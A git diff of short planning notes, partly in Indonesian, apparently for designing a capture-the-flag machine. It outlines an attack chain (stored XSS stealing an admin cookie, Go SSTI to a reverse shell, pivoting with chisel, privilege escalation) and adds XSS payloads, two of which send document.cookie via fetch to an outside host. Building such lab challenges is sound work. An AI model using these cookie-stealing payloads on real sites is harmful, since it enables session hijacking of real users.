@@ -1,9 +1,25 @@
 1. step :
 - go get github.com/mattn/go-sqlite3
-
+- go get github.com/chromedp/chromedp, buat bot yang visit xss payload secara berulang
 
 
 X. goal :
 1. user auth login -> stored xss cookie admin steal -> admin can fill form vuln for SSTI go lang  -> revshell being user1
 2. pivoting with chisel -> ss tulnp -> other web exploit -> being user2
 3. privesc as user2
+
+
+
+2. catatan 
+Repository: Query DB, hash password
+Service: Validasi input, business logic, generate JWT
+Handler: Parse request, tulis response HTTP
+
+
+
+3. xss payload :
+- <img src=x onerror=alert(1)> 
+- <img src=x onerror=fetch('http://ip:8000/?c='+document.cookie)>, steal cookie
+- <img src=x onerror=fetch('http://192.168.1.4:8000/?c='+document.cookie)>, steal cookie
+
+
